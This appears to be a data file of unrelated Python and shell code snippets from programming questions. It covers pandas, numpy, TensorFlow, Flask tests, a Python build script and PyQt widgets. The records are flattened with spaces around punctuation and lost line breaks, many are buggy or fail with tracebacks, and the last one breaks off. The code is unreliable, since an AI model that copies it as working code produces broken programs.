'' could not be deleted ' % backup_dirname ) log.error ( 'manual deletion of backup directory `` % s '' necessary ' % backup_dirname ) print ' > ' print ' > ******WARNING****** ' print ' > directory `` % s '' successfully processed ' % dirname print ' > cleanup of backup directory `` % s '' failed ' % backup_dirname print ' > manual cleanup necessary ' print ' > ******WARNING****** ' print ' > '"
"U = Union [ int , str ] T = TypeVar ( `` T '' , int , str )"
"PATHS [ , . ( completed=sum ( exists ) , missing=sum ( not ( exists ) ) , total=.N , 'size ( G ) '=sum ( sizeMB ) /1024 ) , by= . ( projectPath , pipelineId ) ] projectPath pipelineId completed missing size ( G ) /data/pnl/projects/TRACTS/pnlpipe 0 2568 0 45.30824/data/pnl/projects/TRACTS/pnlpipe 1 1299 0 62.69934"
"df = pandas.DataFrame ( dict ( a= [ 1 , 2 , 3 , 4 , 5 , 6 ] , b= [ 6 , 7 , 8 , 9 , 0 , 0 ] ) , index=pandas.MultiIndex.from_product ( [ [ 1 , 2 ] , [ 3 , 4 , 5 ] ] ) ) a b1 3 1 6 4 2 7 5 3 82 3 4 9 4 5 0 5 6 0 df.groupby ( level=0 ) .apply ( lambda x : x.sum ( axis=1 ) ) 1 1 3 7 4 9 5 112 2 3 13 4 5 5 6dtype : int64 df.groupby ( level= [ 0,1 ] ) .apply ( lambda x : x.sum ( axis=1 ) ) 1 3 1 3 7 4 1 4 9 5 1 5 112 3 2 3 13 4 2 4 5 5 2 5 6dtype : int64 df.groupby ( level= [ 0,1 ] , as_index=False ) .apply ( lambda x : x.sum ( axis=1 ) ) 0 1 3 71 1 4 92 1 5 113 2 3 134 2 4 55 2 5 6dtype : int64"
import numpy as npf2 = ( f2-np.min ( f2 ) ) / ( np.max ( f2 ) -np.min ( f2 ) ) # f2 is now between 0.0 and 1.0f2 = f2* ( np.max ( f1 ) -np.min ( f1 ) ) + np.min ( f1 ) # f2 is now between min ( f1 ) and max ( f1 ) np.max ( f1 ) # 5.0230593np.max ( f2 ) # 5.0230602 but I need 5.0230593 exp = 0mm = np.max ( f1 ) # find where the decimal iswhile int ( 10**exp*mm ) == 0 exp += 1 # add 4 digits of precisionexp += 4scale = 10**expf2 = np.round ( f2*scale ) /scalef1 = np.round ( f1*scale ) /scale scale = 10** ( -np.floor ( np.log10 ( np.max ( f1 ) ) ) + 4 )
"a = np.random.random ( ( 5,5,5,3 ) ) - 0.5s = a.sum ( ( 0,1,2 ) ) np.linalg.norm ( s )"
"def s_smallest ( L ) : if ( len ( L ) == 2 ) : if ( L [ 0 ] > = L [ 1 ] ) : return ( L [ 1 ] , L [ 0 ] ) else : return ( L [ 0 ] , L [ 1 ] ) else : first_smallest , second_smallest = s_smallest ( L [ 1 : ] ) if L [ 0 ] > = first_smallest and L [ 0 ] < = second_smallest : return ( first_smallest , L [ 0 ] ) elif L [ 0 ] < = first_smallest : return ( L [ 0 ] , first_smallest ) else : return ( first_smallest , second_smallest ) if isinstance ( L [ 0 ] , list ) : first_smallest , second_smallest = s_smallest ( L [ 0 ] ) else : first_smallest , second_smallest = s_smallest ( L [ 1 : ] )"
"classifier = tf.estimator.Estimator ( model_fn=my_neural_network_model , model_dir=some_path_to_save_checkpoints , params= { some_parameters } ) classifier.train ( input_fn=data_train_estimator , steps=step_num ) def data_train_estimator ( ) : dataset = tf.data.TextLineDataset ( train_csv_file ) .map ( _parse_csv_train ) dataset = dataset.batch ( 100 ) dataset = dataset.shuffle ( 1000 ) dataset = dataset.repeat ( ) iterator = dataset.make_one_shot_iterator ( ) feature , label = iterator.get_next ( ) return feature , label"
qtyPERIOD_NAME 2017-09-01 49842.02017-10-01 27275.02017-11-01 29159.02017-12-01 51344.02018-01-01 19103.02018-02-01 23570.02018-03-01 45139.02018-04-01 25722.02018-05-01 22644.0 tgt_item_by_445_wk = tgt_item_by_445_wk.resample ( ' W ' ) .sum ( ) qtyPERIOD_NAME 2017-09-03 49842.02017-09-10 0.02017-09-17 0.02017-09-24 0.02017-10-01 27275.02017-10-08 0.02017-10-15 0.02017-10-22 0.02017-10-29 0.0 qtyPERIOD_NAME 2017-09-03 12460.52017-09-10 12460.52017-09-17 12460.52017-09-24 12460.52017-10-01 5455.02017-10-08 5455.02017-10-15 5455.02017-10-22 5455.02017-10-29 5455.0
"import numpy as npfrom scipy.stats import kurtosisfrom scipy.ndimage.filters import generic_filtermat = np.random.random_sample ( ( 5000 , 5000 ) ) kurtosis_filter = generic_filter ( mat , kurtosis , size=25 , mode='reflect ' ) usual_mean = uniform_filter ( mat , size=25 , mode='reflect ' ) mean_of_squared = uniform_filter ( np.multiply ( mat , mat ) , size=25 , mode='reflect ' ) standard_deviation = ( mean_of_squared - np.multiply ( usual_mean , usual_mean ) ) **.5"
try : import pwd do stuffexcept ImportError : do other stuff
target_var input1 input2 input3 input4 input5 input6Date2013-09-01 13.0 NaN NaN NaN NaN NaN NaN 2013-10-01 13.0 NaN NaN NaN NaN NaN NaN 2013-11-01 12.2 NaN NaN NaN NaN NaN NaN 2013-12-01 10.9 NaN NaN NaN NaN NaN NaN 2014-01-01 11.7 0 13 42 0 0 16 2014-02-01 12.0 13 8 58 0 0 14 2014-03-01 12.8 13 15 100 0 0 24 2014-04-01 13.1 0 11 50 34 0 18 2014-05-01 12.2 12 14 56 30 71 18 2014-06-01 11.7 13 16 43 44 0 22 2014-07-01 11.2 0 19 45 35 0 18 2014-08-01 11.4 12 16 37 31 0 24 2014-09-01 10.9 14 14 47 30 56 20 2014-10-01 10.5 15 17 54 24 56 22 2014-11-01 10.7 12 18 60 41 63 21 2014-12-01 9.6 12 14 42 29 53 16 2015-01-01 10.2 10 16 37 31 0 20 2015-02-01 10.7 11 20 39 28 0 19 2015-03-01 10.9 10 17 75 27 87 22 2015-04-01 10.8 14 17 73 30 43 25 2015-05-01 10.2 10 17 55 31 52 24
find . -name `` *.py '' -print0 | xargs -0 python2 -m py_compile
"# include < Python.h > int main ( int argc , char** argv ) { Py_SetPythonHome ( argv [ 1 ] ) ; Py_Initialize ( ) ; PyRun_SimpleString ( `` print \ '' Hello ! \ '' '' ) ; Py_Finalize ( ) ; return 0 ; } g++ hello.cpp -o hello \-I /home/caduchon/softs/python/2.7.9/64/gcc/4.8.5/static/include/python2.7 \-L /home/caduchon/softs/python/2.7.9/64/gcc/4.8.5/static/lib \-l python2.7 -l pthread -l util -l dl > ./hello /home/caduchon/softs/python/2.7.9/64/gcc/4.8.5/dynamicFatal Python error : PyThreadState_Get : no current threadAborted ( core dumped ) # ! /bin/bashWORKDIR=/home/caduchon/tmp/install_python_2_7_13ARCHIVEDIR=/home/caduchon/downloads/pythonPYTHON_VERSION= ' 2.7.13'EZ_SETUP_VERSION= ' 0.9'SETUPTOOLS_VERSION='34.1.0'CYTHON_VERSION= ' 0.25.2'NUMPY_VERSION= ' 1.12.0'SCIPY_VERSION= ' 0.18.1'MATPLOTLIB_VERSION= ' 2.0.0'INSTALLDIR=/home/caduchon/softs/python/ $ PYTHON_VERSION/64/gcc/4.8.5LAPACKDIR=/home/caduchon/softs/lapack/3.6.1/64/gcc/4.8.5 # # # Tkinter # # # echo `` Install Tkinter '' sudo apt-get install tk-dev # # # Workdir # # # echo `` Create workdir '' mkdir -p $ WORKDIR/staticmkdir -p $ WORKDIR/dynamic # # # Pythonfor x in static dynamicdo echo `` Install Python ( $ x ) '' cd $ WORKDIR/ $ x echo `` extract archive '' cp $ ARCHIVEDIR/Python- $ PYTHON_VERSION.tgz . tar -xzf ./Python- $ PYTHON_VERSION.tgz & > archive.log cd ./Python- $ PYTHON_VERSION echo `` configure '' if [ `` $ x '' = `` static '' ] then ./configure -- prefix= $ INSTALLDIR/ $ x -- libdir= $ INSTALLDIR/ $ x/lib & > configure.log else export LD_RUN_PATH= $ INSTALLDIR/ $ x/lib ./configure -- enable-shared -- prefix= $ INSTALLDIR/ $ x -- exec-prefix= $ INSTALLDIR/ $ x -- libdir= $ INSTALLDIR/ $ x/lib & > configure.log fi echo `` build '' make & > make.log echo `` install '' make install & > make_install.log echo `` done '' done # # # setuptoolsfor x in static dynamicdo echo `` Install setuptools ( $ x ) '' cd $ WORKDIR/ $ x echo `` extract archives '' cp $ ARCHIVEDIR/ez_setup- $ EZ_SETUP_VERSION.tar.gz . tar -xzf ./ez_setup- $ EZ_SETUP_VERSION.tar.gz & > archive.log cp $ ARCHIVEDIR/setuptools- $ SETUPTOOLS_VERSION.zip . unzip ./setuptools- $ SETUPTOOLS_VERSION.zip & > archive.log cp ./ez_setup- $ EZ_SETUP_VERSION/ez_setup.py ./setuptools- $ SETUPTOOLS_VERSION/ . cd ./setuptools- $ SETUPTOOLS_VERSION echo `` install '' $ INSTALLDIR/ $ x/bin/python ./ez_setup.py & > setup.log echo `` done '' done # # # Cythonfor x in static dynamicdo echo `` Install Cython ( $ x ) '' cd $ WORKDIR/ $ x echo `` extract archive '' cp $ ARCHIVEDIR/Cython- $ CYTHON_VERSION.tar.gz . tar -xzf ./Cython- $ CYTHON_VERSION.tar.gz & > archive.log cd ./Cython- $ CYTHON_VERSION echo `` install '' $ INSTALLDIR/ $ x/bin/python ./setup.py install & > install.log echo `` done '' done # # # NumPyfor x in static dynamicdo echo `` Install NumPy ( $ x ) '' cd $ WORKDIR/ $ x echo `` extract archive '' cp $ ARCHIVEDIR/numpy- $ NUMPY_VERSION.zip . unzip ./numpy- $ NUMPY_VERSION.zip & > archive.log cd ./numpy- $ NUMPY_VERSION echo `` build '' $ INSTALLDIR/ $ x/bin/python ./setup.py build -- fcompiler=gfortran & > build.log echo `` install '' $ INSTALLDIR/ $ x/bin/python ./setup.py install & > install.log echo `` done '' done # # # SciPyfor x in static dynamicdo echo `` Install SciPy ( $ x ) '' cd $ WORKDIR/ $ x echo `` extract archive '' cp $ ARCHIVEDIR/scipy- $ SCIPY_VERSION.tar.gz . tar -xzf ./scipy- $ SCIPY_VERSION.tar.gz & > archive.log cd ./scipy- $ SCIPY_VERSION echo `` configure '' echo `` [ DEFAULT ] '' > ./site.cfg echo `` library_dirs = $ LAPACKDIR/lib64 '' > > ./site.cfg echo `` search_static_first = true '' > > ./site.cfg echo `` build '' $ INSTALLDIR/ $ x/bin/python ./setup.py build -- fcompiler=gfortran & > build.log echo `` install '' $ INSTALLDIR/ $ x/bin/python ./setup.py install & > install.log echo `` done '' done # # # MatPlotLibfor x in static dynamicdo echo `` Install MatPlotLib ( $ x ) '' cd $ WORKDIR/ $ x echo `` extract archive '' cp $ ARCHIVEDIR/matplotlib- $ MATPLOTLIB_VERSION.tar.gz . tar -xzf ./matplotlib- $ MATPLOTLIB_VERSION.tar.gz & > archive.log cd ./matplotlib- $ MATPLOTLIB_VERSION echo `` build '' $ INSTALLDIR/ $ x/bin/python ./setup.py build & > build.log echo `` install '' $ INSTALLDIR/ $ x/bin/python ./setup.py install & > install.log echo `` done '' done"
import syssys.exit ( 3 ) python error.py ; echo $ ? import osresult = os.system ( `` python error.py '' ) print result
A B C D 0 1 2 1 11 2 3 0 32 3 4 0 43 4 5 1 4
"with open ( infile , ' r ' ) as fin : passwith open ( outfile , ' w ' ) as fout : pass with open ( outfile , ' w ' ) as fout : with open ( infile , ' r ' ) as fin : fout.write ( fin.read ( ) ) with open ( infile , ' r ' ) , open ( outfile , ' w ' ) as fin , fout : fout.write ( fin.read ( ) )"
"# models.py located in /myapp/some_installed_app/from django import needed.modules ... # some reference to signals.py ? class SomeModel ( ) pass # signals.py located in /myapp/some_installed_app/from django import needed.things ... def somefun ( sender , **kwargs ) passpost_save.connect ( somefun , sender=SomeModel )"
"lst = [ Mary , John , Anna , Peter , Laura , Lisa , Steve ] Anna.job.hours # 10Lisa.job.hours # 5Steve.job.hours # 8 [ Lisa , Steve , Anna , Mary , John , Peter , Laura ] with_job = [ person for person in lst if person.job ] without_job = [ person for person in lst if not person.job ] with_job.sort ( key=lambda p : p.job.hours ) lst = with_job + without_job"
"# coding=utf-8import rclpyimport rclpy.node as nodeimport cv2import numpy as npimport sensor_msgs.msg as msgimport third_party.ros.ros as rosclass TestDisplayNode ( node.Node ) : def __init__ ( self ) : super ( ) .__init__ ( 'IProc_TestDisplayNode ' ) self.__window_name = `` img '' self.sub = self.create_subscription ( msg.Image , 'Vision_sensor ' , self.msg_callback ) def msg_callback ( self , m : msg.Image ) : np_img = np.reshape ( m.data , ( m.height , m.width , 3 ) ) .astype ( np.uint8 ) self.display ( np_img ) def display ( self , img : np.ndarray ) : cv2.imshow ( self.__window_name , cv2.cvtColor ( img , cv2.COLOR_RGB2BGR ) ) cv2.waitKey ( 1 ) def main ( ) : ros_core = Ros2CoreWrapper ( ) node = TestDisplayNode ( ) rclpy.spin ( node ) node.destroy_node ( ) rclpy.shutdown ( ) if __name__ == `` __main__ '' : main ( )"
"myList = [ 1 , `` two '' ] `` { 0 } and { 1 } '' .format ( *myList ) `` and `` .join ( myList ) > > > `` and `` .join ( myList ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > TypeError : sequence item 0 : expected string , int found"
"with open ( 'train.json ' , ' r ' ) as fp : cl = NaiveBayesClassifier ( fp , format= '' json '' ) > > > train_set = [ ( Counter ( i [ `` text '' ] .split ( ) ) , i [ `` label '' ] ) for i in data [ 200 : ] ] > > > test_set = [ ( Counter ( i [ `` text '' ] .split ( ) ) , i [ `` label '' ] ) for i in data [ :200 ] ] # withholding 200 examples for testing later > > > cl = nltk.NaiveBayesClassifier.train ( train_set ) # < -- this is the same thing textblob was using > > > print ( `` Classifier accuracy percent : '' , ( nltk.classify.accuracy ( cl , test_set ) ) *100 ) ( 'Classifier accuracy percent : ' , 66.5 ) > > > > cl.show_most_informative_features ( 75 ) with open ( 'storybayes.pickle ' , 'wb ' ) as f : pickle.dump ( cl , f ) from textblob.classifiers import NaiveBayesClassifierblob = TextBlob ( `` I love this library '' , analyzer=NaiveBayesAnalyzer ( ) ) blob = TextBlob ( `` I love this library '' , analyzer=myclassifier ) Traceback ( most recent call last ) : File `` < pyshell # 116 > '' , line 1 , in < module > blob = TextBlob ( `` I love this library '' , analyzer=cl4 ) File `` C : \python\lib\site-packages\textblob\blob.py '' , line 369 , in __init__ parser , classifier ) File `` C : \python\lib\site-packages\textblob\blob.py '' , line 323 , in _initialize_models BaseSentimentAnalyzer , BaseBlob.analyzer ) File `` C : \python\lib\site-packages\textblob\blob.py '' , line 305 , in _validated_param .format ( name=name , cls=base_class_name ) ) ValueError : analyzer must be an instance of BaseSentimentAnalyzer"
"import tensorflow_datasets as tfdstrain_validation_split = tfds.Split.TRAIN.subsplit ( [ 6 , 4 ] ) ( train_data , validation_data ) , test_data = tfds.load ( name= '' imdb_reviews '' , split= ( train_validation_split , tfds.Split.TEST ) , as_supervised=True ) foo = train_data.take ( 5 ) [ In ] for i , x in enumerate ( foo ) : print ( i ) 01234 -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -TypeError Traceback ( most recent call last ) < ipython-input-44-2acbea6d9862 > in < module > -- -- > 1 foo [ 0 ] TypeError : 'TakeDataset ' object does not support indexing"
"ERROR : test_home_welcome_return ( tests.home_page_tests.HomePageTestClass ) -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- Traceback ( most recent call last ) : File `` /home/xibalba/code/reel/tests/home_page_tests.py '' , line 31 , in test_home_welcome_return self.assertIn ( u '' Welcome to Reel ! `` , response.data ) File `` /usr/local/lib/python3.6/unittest/case.py '' , line 1077 , in assertIn if member not in container : TypeError : a bytes-like object is required , not 'str ' # Test Suiteimport unittestfrom reel import appfrom reel.views import home_welcomeclass HomePageTesttClass ( unittest.TestCase ) : @ classmethod def setupClass ( cls ) : pass @ classmethod def tearDownClass ( cls ) : pass def setUp ( self ) : self.app = app.test_client ( ) self.app.testing = True def test_homepage_response ( self ) : result = self.app.get ( '/ ' ) self.assertEqual ( result.status_code , 200 ) self.assertIn ( b '' Welcome to Reel ! `` , result.data ) def tearDown ( self ) : passif __name__ == '__main__ ' : unittest.main ( ) from reel import appfrom flask import render_template @ app.route ( '/ ' ) def home_welcome ( ) : return render_template ( `` homepage.html '' ) @ app.route ( '/signup ' ) def signup_welcome ( ) : return 'Welcome to the signup page ! ' @ app.route ( '/login ' ) def login_welcome ( ) : return 'Welcome to the login page ! ' @ app.route ( '/become_a_guide ' ) def guide_welcome ( ) : return 'Welcome to the guide page ! ' @ app.route ( '/help ' ) def help_welcome ( ) : return 'Welcome to the help page ! '"
"class Tree ( object ) : def __init__ ( self , parent=None , value=None ) : self.parent = parent self.value = value self.children = set ( ) def isexternal ( self ) : `` '' '' Return True if this is an external tree . '' '' '' return not bool ( self.children ) def isleaf ( self ) : `` '' '' Return True if this is a leaf tree . '' '' '' return not bool ( self.children ) def isleaf ( self ) : `` '' '' Return True of this is a leaf tree . '' '' '' return self.isexternal ( ) def isancestor ( self , tree ) : `` '' '' Return True if this tree is an ancestor of the specified tree . '' '' '' return tree.parent is self or ( not tree.isroot ( ) and self.isancestor ( tree.parent ) ) def isdescendant ( self , tree ) : `` '' '' Return True if this tree is a descendant of the specified tree . '' '' '' return self.parent is tree or ( not self.isroot ( ) and self.parent.isdescendant ( tree ) ) def isdescendant ( self , tree ) : `` '' '' Return True if this tree is a descendant of the specified tree . '' '' '' return tree.isancestor ( self )"
logger = logging.getLogger ( ) logger.setLevel ( logging.WARN )
"html = `` ' < ! -- Python is awesome -- > < ! -- Lambda is confusing -- > < title > I do n't grok it < /title > `` 'soup = BeautifulSoup ( html , 'html.parser ' ) comments = soup.find_all ( text= lambda text : isinstance ( text , Comment ) ) [ ' Python is awesome ' , ' Lambda is confusing ' ]"
"x = rand ( 500,500 ) x = ( x+x.T ) all ( x==x.T ) > True x = rand ( 500,500 ) x += x.Tall ( x==x.T ) > False x==x.T > array ( [ [ True , True , True , ... , False , False , False ] , [ True , True , True , ... , False , False , False ] , [ True , True , True , ... , False , False , False ] , ... , [ False , False , False , ... , True , True , True ] , [ False , False , False , ... , True , True , True ] , [ False , False , False , ... , True , True , True ] ] , dtype=bool ) x = rand ( 50,50 ) x += x.Tall ( x==x.T ) > True x = rand ( 90,90 ) x += x.Tall ( x==x.T ) > Truex = rand ( 91,91 ) x += x.Tall ( x==x.T ) > False x = rand ( 91,91 ) x = ( x+x.T ) all ( x==x.T ) > True"
"@ patch ( `` some.core.function '' , mocked_method ) class BaseTest ( unittest.TestCase ) : # methods passclass TestFunctions ( BaseTest ) : # methods pass"
"a , b = 1 , 2params = [ ' a ' , ' b ' ] res = { p : vars ( ) [ p ] for p in params } a , b = 1 , 2params = [ ' a ' , ' b ' ] res = { } for p in params : res [ p ] = vars ( ) [ p ]"
"> > > l= [ 0,1,2,3,4,5 ] > > > for i in range ( 2 , len ( l ) ) : l [ i ] = None > > > l [ 0 , 1 , None , None , None , None ] > > > l= [ 0,1,2,3,4,5 ] > > > l [ 2 : ] = [ None ] * ( len ( l ) -2 ) > > > l [ 0 , 1 , None , None , None , None ] > > > l= [ 0,1,2,3,4,5 ] > > > l [ 2 : ] = [ None for _ in range ( len ( l ) -2 ) ] > > > l [ 0 , 1 , None , None , None , None ] > > > import itertools > > > l= [ 0,1,2,3,4,5 ] > > > l [ 2 : ] = itertools.repeat ( None , len ( l ) -2 ) > > > l [ 0 , 1 , None , None , None , None ]"
+ -- -- -- -+ -- -- -- -- -- -- + -- -- -- -- -+ -- -- -- -- -- -+| Store | Date | Sales | Customers |+ -- -- -- -+ -- -- -- -- -- -- + -- -- -- -- -+ -- -- -- -- -- -+| 1 | 2015-07-31 | 5263.0 | 555.0 || 2 | 2015-07-31 | 6064.0 | 625.0 || 3 | 2015-07-31 | 8314.0 | 821.0 || 4 | 2015-07-31 | 13995.0 | 1498.0 || 3 | 2015-07-20 | 4822.0 | 559.0 || 2 | 2015-07-10 | 5651.0 | 589.0 || 4 | 2015-07-11 | 15344.0 | 1414.0 || 5 | 2015-07-23 | 8492.0 | 833.0 || 2 | 2015-07-19 | 8565.0 | 687.0 || 10 | 2015-07-09 | 7185.0 | 681.0 |+ -- -- -- -+ -- -- -- -- -- -- + -- -- -- -- -+ -- -- -- -- -- -+ [ 986159 rows x 4 columns ] + -- -- -- -+ -- -- -- + -- -- + -- -- + -- -- -- -- -+ -- -- -- -- -- -+| Store | YYYY | MM | DD | Sales | Customers |+ -- -- -- -+ -- -- -- + -- -- + -- -- + -- -- -- -- -+ -- -- -- -- -- -+| 1 | 2015 | 07 | 31 | 5263.0 | 555.0 || 2 | 2015 | 07 | 31 | 6064.0 | 625.0 || 3 | 2015 | 07 | 31 | 8314.0 | 821.0 |+ -- -- -- -+ -- -- -- -- -- -- + -- -- -- -- -+ -- -- -- -- -- -+ [ 986159 rows x 4 columns ]
"class MainWindow ( QtGui.QMainWindow ) : # initialize def __init__ ( self ) : # Call parent constructor super ( MainWindow , self ) .__init__ ( ) # Load the interface self.ui = uic.loadUi ( r '' Form Files/rsleditor.ui '' ) # Show the ui self.ui.show ( ) def closeEvent ( self , event ) : quit_msg = `` Are you sure you want to exit the program ? '' reply = QtGui.QMessageBox.question ( self , 'Message ' , quit_msg , QtGui.QMessageBox.Yes , QtGui.QMessageBox.No ) if reply == QtGui.QMessageBox.Yes : self.saveSettings ( ) event.accept ( ) else : event.ignore ( ) self.ui = uic.loadUi ( r '' Form Files/rsleditor.ui '' , self ) RSLEditorClass.setIconSize ( QtCore.QSize ( 24 , 24 ) ) self.centralWidget = QtGui.QWidget ( RSLEditorClass ) sizePolicy = QtGui.QSizePolicy ( QtGui.QSizePolicy.Preferred , QtGui.QSizePolicy.Preferred ) sizePolicy.setHorizontalStretch ( 0 ) sizePolicy.setVerticalStretch ( 0 ) sizePolicy.setHeightForWidth ( self.centralWidget.sizePolicy ( ) .hasHeightForWidth ( ) ) self.centralWidget.setSizePolicy ( sizePolicy ) self.centralWidget.setObjectName ( _fromUtf8 ( `` centralWidget '' ) ) self.vLayMain = QtGui.QVBoxLayout ( self.centralWidget ) self.vLayMain.setObjectName ( _fromUtf8 ( `` vLayMain '' ) ) self.hLayFilePath = QtGui.QHBoxLayout ( ) self.hLayFilePath.setObjectName ( _fromUtf8 ( `` hLayFilePath '' ) ) self.lbFilePath = QtGui.QLabel ( self.centralWidget ) self.lbFilePath.setObjectName ( _fromUtf8 ( `` lbFilePath '' ) ) self.hLayFilePath.addWidget ( self.lbFilePath ) self.txtFilePath = QtGui.QLineEdit ( self.centralWidget ) self.txtFilePath.setObjectName ( _fromUtf8 ( `` txtFilePath '' ) ) self.hLayFilePath.addWidget ( self.txtFilePath ) self.vLayMain.addLayout ( self.hLayFilePath ) self.splitTxt = QtGui.QSplitter ( self.centralWidget ) sizePolicy = QtGui.QSizePolicy ( QtGui.QSizePolicy.Preferred , QtGui.QSizePolicy.Expanding ) sizePolicy.setHorizontalStretch ( 0 ) sizePolicy.setVerticalStretch ( 1 ) sizePolicy.setHeightForWidth ( self.splitTxt.sizePolicy ( ) .hasHeightForWidth ( ) ) self.splitTxt.setSizePolicy ( sizePolicy ) self.splitTxt.setLineWidth ( 0 ) self.splitTxt.setMidLineWidth ( 0 ) self.splitTxt.setOrientation ( QtCore.Qt.Vertical ) self.splitTxt.setHandleWidth ( 10 ) self.splitTxt.setObjectName ( _fromUtf8 ( `` splitTxt '' ) ) self.tabMain = QtGui.QTabWidget ( self.splitTxt ) self.tabMain.setBaseSize ( QtCore.QSize ( 0 , 0 ) ) self.tabMain.setElideMode ( QtCore.Qt.ElideNone ) self.tabMain.setTabsClosable ( True ) self.tabMain.setMovable ( False ) self.tabMain.setObjectName ( _fromUtf8 ( `` tabMain '' ) ) self.tabOutput = QtGui.QTabWidget ( self.splitTxt ) self.tabOutput.setObjectName ( _fromUtf8 ( `` tabOutput '' ) ) self.tabRSLOut = QtGui.QWidget ( ) self.tabRSLOut.setObjectName ( _fromUtf8 ( `` tabRSLOut '' ) ) self.vLayRSL = QtGui.QVBoxLayout ( self.tabRSLOut ) self.vLayRSL.setObjectName ( _fromUtf8 ( `` vLayRSL '' ) ) self.txtRSLOut = QtGui.QTextEdit ( self.tabRSLOut ) self.txtRSLOut.setTextInteractionFlags ( QtCore.Qt.TextEditable ) self.txtRSLOut.setObjectName ( _fromUtf8 ( `` txtRSLOut '' ) ) self.vLayRSL.addWidget ( self.txtRSLOut ) self.tabOutput.addTab ( self.tabRSLOut , _fromUtf8 ( `` '' ) ) self.tabRIBOut = QtGui.QWidget ( ) self.tabRIBOut.setObjectName ( _fromUtf8 ( `` tabRIBOut '' ) ) self.vLayRib = QtGui.QVBoxLayout ( self.tabRIBOut ) self.vLayRib.setObjectName ( _fromUtf8 ( `` vLayRib '' ) ) self.txtRIBOut = QtGui.QTextEdit ( self.tabRIBOut ) self.txtRIBOut.setTextInteractionFlags ( QtCore.Qt.TextEditable ) self.txtRIBOut.setObjectName ( _fromUtf8 ( `` txtRIBOut '' ) ) self.vLayRib.addWidget ( self.txtRIBOut ) self.tabOutput.addTab ( self.tabRIBOut , _fromUtf8 ( `` '' ) ) self.vLayMain.addWidget ( self.splitTxt ) RSLEditorClass.setCentralWidget ( self.centralWidget ) self.menuBar = QtGui.QMenuBar ( RSLEditorClass ) self.menuBar.setGeometry ( QtCore.QRect ( 0 , 0 , 750 , 21 ) ) self.menuBar.setObjectName ( _fromUtf8 ( `` menuBar '' ) ) self.menuFile = QtGui.QMenu ( self.menuBar ) self.menuFile.setObjectName ( _fromUtf8 ( `` menuFile '' ) ) self.menuRecent_Files = QtGui.QMenu ( self.menuFile ) self.menuRecent_Files.setObjectName ( _fromUtf8 ( `` menuRecent_Files '' ) ) self.menuEdit = QtGui.QMenu ( self.menuBar ) self.menuEdit.setObjectName ( _fromUtf8 ( `` menuEdit '' ) ) self.menuSearch_Options = QtGui.QMenu ( self.menuEdit ) self.menuSearch_Options.setObjectName ( _fromUtf8 ( `` menuSearch_Options '' ) ) self.menuView = QtGui.QMenu ( self.menuBar ) self.menuView.setObjectName ( _fromUtf8 ( `` menuView '' ) ) self.menuSearch = QtGui.QMenu ( self.menuBar ) self.menuSearch.setObjectName ( _fromUtf8 ( `` menuSearch '' ) ) self.menuDebug = QtGui.QMenu ( self.menuBar ) self.menuDebug.setObjectName ( _fromUtf8 ( `` menuDebug '' ) ) self.menuHelp = QtGui.QMenu ( self.menuBar ) self.menuHelp.setObjectName ( _fromUtf8 ( `` menuHelp '' ) ) RSLEditorClass.setMenuBar ( self.menuBar ) self.mainToolBar = QtGui.QToolBar ( RSLEditorClass ) self.mainToolBar.setObjectName ( _fromUtf8 ( `` mainToolBar '' ) ) RSLEditorClass.addToolBar ( QtCore.Qt.TopToolBarArea , self.mainToolBar ) self.actionNew = QtGui.QAction ( RSLEditorClass ) icon1 = QtGui.QIcon ( ) icon1.addPixmap ( QtGui.QPixmap ( _fromUtf8 ( `` : /icons/new.png '' ) ) , QtGui.QIcon.Normal , QtGui.QIcon.Off ) self.actionNew.setIcon ( icon1 ) self.actionNew.setObjectName ( _fromUtf8 ( `` actionNew '' ) ) self.actionOpen = QtGui.QAction ( RSLEditorClass ) icon2 = QtGui.QIcon ( ) icon2.addPixmap ( QtGui.QPixmap ( _fromUtf8 ( `` : /icons/open.png '' ) ) , QtGui.QIcon.Normal , QtGui.QIcon.Off ) self.actionOpen.setIcon ( icon2 ) self.actionOpen.setObjectName ( _fromUtf8 ( `` actionOpen '' ) ) self.actionSave = QtGui.QAction ( RSLEditorClass ) icon3 = QtGui.QIcon ( ) icon3.addPixmap ( QtGui.QPixmap ( _fromUtf8 ( `` : /icons/save.png '' ) ) , QtGui.QIcon.Normal , QtGui.QIcon.Off ) self.actionSave.setIcon ( icon3 ) self.actionSave.setObjectName ( _fromUtf8 ( `` actionSave '' ) ) self.actionSave_As = QtGui.QAction ( RSLEditorClass ) icon4 = QtGui.QIcon ( ) icon4.addPixmap ( QtGui.QPixmap ( _fromUtf8 ( `` : /icons/save as.png '' ) ) , QtGui.QIcon.Normal , QtGui.QIcon.Off ) self.actionSave_As.setIcon ( icon4 ) self.actionSave_As.setObjectName ( _fromUtf8 ( `` actionSave_As '' ) ) self.actionUndo = QtGui.QAction ( RSLEditorClass ) icon5 = QtGui.QIcon ( ) icon5.addPixmap ( QtGui.QPixmap ( _fromUtf8 ( `` : /icons/undo.png '' ) ) , QtGui.QIcon.Normal , QtGui.QIcon.Off ) self.actionUndo.setIcon ( icon5 ) self.actionUndo.setObjectName ( _fromUtf8 ( `` actionUndo '' ) ) self.actionRedo = QtGui.QAction ( RSLEditorClass ) icon6 = QtGui.QIcon ( ) icon6.addPixmap ( QtGui.QPixmap ( _fromUtf8 ( `` : /icons/redo.png '' ) ) , QtGui.QIcon.Normal , QtGui.QIcon.Off ) self.actionRedo.setIcon ( icon6 ) self.actionRedo.setObjectName ( _fromUtf8 ( `` actionRedo '' ) ) self.actionCut = QtGui.QAction ( RSLEditorClass ) icon7 = QtGui.QIcon ( ) icon7.addPixmap ( QtGui.QPixmap ( _fromUtf8 ( `` : /icons/cut.png '' ) ) , QtGui.QIcon.Normal , QtGui.QIcon.Off ) self.actionCut.setIcon ( icon7 ) self.actionCut.setObjectName ( _fromUtf8 ( `` actionCut '' ) ) self.actionCopy = QtGui.QAction ( RSLEditorClass ) icon8 = QtGui.QIcon ( ) icon8.addPixmap ( QtGui.QPixmap ( _fromUtf8 ( `` : /icons/copy.png '' ) ) , QtGui.QIcon.Normal , QtGui.QIcon.Off ) self.actionCopy.setIcon ( icon8 ) self.actionCopy.setObjectName ( _fromUtf8 ( `` actionCopy '' ) ) self.actionPaste = QtGui.QAction ( RSLEditorClass ) icon9 = QtGui.QIcon ( ) icon9.addPixmap ( 